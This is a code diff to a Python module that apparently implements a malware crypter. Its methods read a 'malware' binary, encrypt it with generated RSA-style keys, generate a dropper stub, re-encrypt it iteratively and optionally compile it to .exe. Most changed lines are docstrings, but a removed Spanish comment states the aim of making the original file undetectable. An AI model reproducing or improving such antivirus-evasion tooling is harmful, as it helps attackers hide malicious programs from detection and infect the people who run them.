@@ -25,6 +25,11 @@ class StartModule():
 		return functions
 
 	def getMalwareData(self, fileName):
+		"""
+		Get's binary from the file given in param as fileName
+		Param fileName: path to the file
+		Return: byte array
+		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
 		file = open(fileName, "rb")
 		file_data = file.read()
@@ -32,6 +37,10 @@ class StartModule():
 		return file_data
 
 	def convertToExe(self, stub_name):
+		"""
+		Convert's given Python file into a new one with the same name and .exe as extension
+		Compile's with pyinstaller and could be change it's params in config.json
+		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
 		# Convert py to exe with pyinstaller
 		import os
@@ -60,19 +69,32 @@ class StartModule():
 			os.remove(spec_file)
 
 	def is_valid_file(self, parser, arg):
+		"""
+		Returns the file if exists, else, print's and error
+		"""
 		if not os.path.exists(arg):
 			parser.error("The file {file} does not exist!".format(file=arg))
 		else:
 			return arg
 
 	def clean_output_dir(self):
+		"""
+		Clean's the output.
+		Is used for removing all bad files we don't want in our path if we want to upload after to Pypi
+		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
 		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
 		if os.path.isdir(output_dir):
 			shutil.rmtree(output_dir)
 
 	def saveStub(self, stub, save_name, print_save_stub=True):
-		# Save the Stub
+		"""
+		Saves a new file with a Byte Array and a filename
+		Param stub: Byte Array
+		Param save_name: String
+		Param print_save_stub: True/False
+		This is used for saving the crypted file when crypt_file() is called
+		"""
 		stub_name = save_name
 		stub_file = open(stub_name, "w")
 		stub_file.write(stub)
@@ -81,7 +103,17 @@ class StartModule():
 			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)
 
 	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
-		# Create Stub in Python File
+		"""
+		Create's the stub for the crypter and has some courious params he have to see:
+		Param crypto_data_hex: Byte Array
+		Param public_key: (x, y)
+		Param drop_file_name: String
+		Param save_name: String
+		Param print_save_stub: True/False
+		Param is_iterating: True/False
+		Param is_last: True/False
+		Param convert: True/False
+		"""
 		stub = ''
 		if is_last:
 			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
@@ -156,12 +188,19 @@ if os.path.exists(drpnm):
 		if convert:
 			self.convertToExe(save_name)
 
-	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', is_iterating=False, prime_length=4, iterate_count=1, is_last=False, print_save_stub=True, compile_exe=False):
+	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, print_save_stub=True, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
 		"""
-		filename es el archivo original a indetectar (filename='servidor.py')
-		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
-		drop_file_name es el nombre con el que se guarda trás ejecutarse el stub para poder ejecutarlo
-		compile_exe es si queremos compilarlo con pyinstaller
+		Crypt's a file when some params we have to use:
+		Param filename: is the path to the file you want to crypt.
+		Param new_file_name: is the final name to our crypted file.
+		Param drop_file_name: is the name could be used to drop a file finaly when executing crypted file. Same name could be same as new_file_name for not dropping a file.
+		Param prime_length: is for generating some RSA keys with those length of prime numbers automatically generated.
+		Param compile_exe: is for telling the crypter to compile it to exe if posible.
+		Param print_save_stub: is for get a message at log when the crypt is finished.
+		Param is_iterating: is used internally for knowing where the bucle is.
+		Param iterate_count: is used internally for knowing where the bucle is.
+		Param is_last: is used internally for knowing where the bucle is.
+
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
 		temp_filename = filename
@@ -170,7 +209,7 @@ if os.path.exists(drpnm):
 			for i in range(1, iterate_count):
 				if i == iterate_count - 1:
 					is_last = True
-				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, is_iterating=True, iterate_count=1, is_last=is_last, print_save_stub=False, compile_exe=False)
+				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, print_save_stub=False, compile_exe=False, is_iterating=True, iterate_count=1, is_last=is_last)
 		
 		filename = temp_filename
 		if filename and new_file_name:
